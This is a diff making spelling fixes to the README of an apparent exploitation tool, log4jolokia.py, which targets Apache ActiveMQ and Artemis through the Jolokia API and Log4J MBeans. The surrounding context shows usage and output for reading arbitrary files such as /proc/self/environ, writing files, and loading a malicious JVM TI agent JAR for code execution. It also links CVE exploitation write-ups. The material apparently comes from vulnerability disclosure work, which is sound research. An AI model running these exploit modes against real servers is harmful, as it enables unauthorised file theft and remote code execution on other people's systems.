@@ -39,7 +39,7 @@ The program has the following 4 exploitation modes:
 
 By modifying the Log4J "ConfigLocationUri" attribute and reading the new content of "ConfigText" (using the "getConfigText(String)" function or performing a Jolokia "read" action on the "ConfigText" attribute) via the Jolokia API, an attacker is able to read arbitrary files.
 
-**Note**: In this case we will be using the "getConfigText(String)" read vector as we can retreive the byte accurate representation of the output of the files in "latin-1" encoding.
+**Note**: In this case we will be using the "getConfigText(String)" read vector as we can retrieve the byte accurate representation of the output of the files in "latin-1" encoding.
 
 **Note 2**: This vector can also be used to access otherwise unreachable/internal servers:
 - read remote files from FTP Server
@@ -89,7 +89,7 @@ sync:x:4:65534:sync:/bin:/bin/sync
 ***TRUNCATED***
 ```
 
-Example - Read "/proc/self/environ" (content contains non-prinatable chars (e.g. null-bytes) so the output will be base64 encoded):
+Example - Read "/proc/self/environ" (content contains non-printable chars (e.g. null-bytes) so the output will be base64 encoded):
 ```
 $ python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -r /proc/self/environ
 [.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
@@ -157,7 +157,7 @@ $ python3 log4jolokia.py write_file http://127.0.0.1:8161/console/jolokia/ -u ad
 [.] Reading content from 00-ff.txt
 [.] Generating Log4J configuration
 [.] Invalid XML characters have been detected in the content
-[.] Using a 2 step write techique (XML -> Properties -> File)
+[.] Using a 2 step write technique (XML -> Properties -> File)
 [+] Generated Log4J Properties configuration
 [+] Embedded Properties configuration in a XML configuration
 [.] Using a double setConfigText in order to flush the buffer
@@ -203,14 +203,14 @@ $ python3 log4jolokia.py exec_jar http://127.0.0.1:8161/console/jolokia/ -u admi
 [!!!] WARNING: You are about to write and execute the contents of "mal_linux.jar" on the target system. Make sure that:
 	- The JAR contains a valid JVM TI agent
 	- Once a JAR is successfully loaded:
-		-- No new JAR can be loaded until the Java applicaiton is restarted (a.k.a. pick your commands wisely because you only have one shot)
+		-- No new JAR can be loaded until the Java application is restarted (a.k.a. pick your commands wisely because you only have one shot)
 		-- The JAR code will execute everytime the jvmtiAgentLoad() function is successfully called (result == "return code: 0")
 
 If you agree with the above enter "yes" to continue: yes
 [.] Reading content from mal_linux.jar
 [.] Generating Log4J configuration
 [.] Invalid XML characters have been detected in the content
-[.] Using a 2 step write techique (XML -> Properties -> File)
+[.] Using a 2 step write technique (XML -> Properties -> File)
 [+] Generated Log4J Properties configuration
 [+] Embedded Properties configuration in a XML configuration
 [.] Using a double setConfigText in order to flush the buffer
@@ -225,7 +225,7 @@ If you agree with the above enter "yes" to continue: yes
 [+] Successfully called jvmtiAgentLoad()
 ```
 
-**Note:** As stated in the "WARNING", once you have successfully loaded a JVM TI Agent JAR (return code: 0), redoing the subsequent requests with new/modified JARs (that are valid) will result in the re-execution of only the initaily/first loaded JAR.
+**Note:** As stated in the "WARNING", once you have successfully loaded a JVM TI Agent JAR (return code: 0), redoing the subsequent requests with new/modified JARs (that are valid) will result in the re-execution of only the initially/first loaded JAR.
 
 #### Execute Scripts:
 
@@ -264,20 +264,20 @@ If you agree with the above enter "yes" to continue: yes
 [+] The script should have been successfully executed
 ```
 
-**Note:** This mode loades the respective script, but has no way of knowing if once the script is loaded it is successfully executed or silently fails.
+**Note:** This mode loads the respective script, but has no way of knowing if once the script is loaded it is successfully executed or silently fails.
 
 ### Additional Resources:
 
-Manual exploitation exemple of the "read_file" mode:
+Manual exploitation example of the "read_file" mode:
 - [CVE-2022-41678: Dangerous MBeans Accessible via Jolokia API in Apache ActiveMQ](https://github.com/mbadanoiu/CVE-2022-41678)
 - [CVE-2023-50780 - Initial Report for Apache ActiveMQ Artemis - PDF](https://github.com/mbadanoiu/CVE-2023-50780/blob/main/Apache%20Artemis%20-%20CVE-2023-50780%20-%20Initial%20Report.pdf)
 
-Manual exploitation exemple of the "write_file" mode resulting in RCE:
+Manual exploitation example of the "write_file" mode resulting in RCE:
 - [Write arbitrary JSP in Apache ActiveMQ Classic - PDF](https://github.com/mbadanoiu/CVE-2022-41678/blob/main/Apache%20ActiveMQ%20-%20CVE-2022-41678.pdf)
 - [Write WAR and restart Jetty in Apache ActiveMQ Artemis - PDF](https://github.com/mbadanoiu/CVE-2023-50780/blob/main/Apache%20Artemis%20-%20CVE-2023-50780%20-%20WAR%20%2B%20Restart%20Vector.pdf)
 
-Manual exploitation exemple of the "exec_jar" mode: 
+Manual exploitation example of the "exec_jar" mode: 
 - [CVE-2023-50780 - JAR + jvmtiAgentLoad in Apache ActiveMQ Artemis - PDF](https://github.com/mbadanoiu/CVE-2023-50780/blob/main/Apache%20Artemis%20-%20CVE-2023-50780%20-%20JAR%20%2B%20jvmtiAgentLoad.pdf)
 
-Manual exploitation exemple of the "exec_script" mode: 
+Manual exploitation example of the "exec_script" mode: 
 - [MAL-011: Log4J Misconfiguration Allows Malicious JavaScript in Red Hat AMQ](https://github.com/mbadanoiu/MAL-011)
